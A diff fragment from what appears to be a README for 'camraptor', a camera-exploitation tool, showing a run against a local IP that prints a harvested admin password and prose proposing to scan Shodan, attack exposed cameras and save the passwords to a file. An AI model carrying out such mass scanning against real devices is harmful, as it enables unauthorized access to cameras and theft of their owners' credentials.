@@ -49,7 +49,7 @@ camraptor -a 192.168.99.100
 ```shell
 [*] Exploiting 192.168.99.100...
 [+] (192.168.99.100) - admin:MySuperPassword
-[*] Finishing...
+[i] Exploit completed.
 ```
 
 Let's try to use Shodan search engine to exploit cameras over Internet and save all obtained passwords to `passwords.txt`, we will use it with `-t` for fast exploitation.
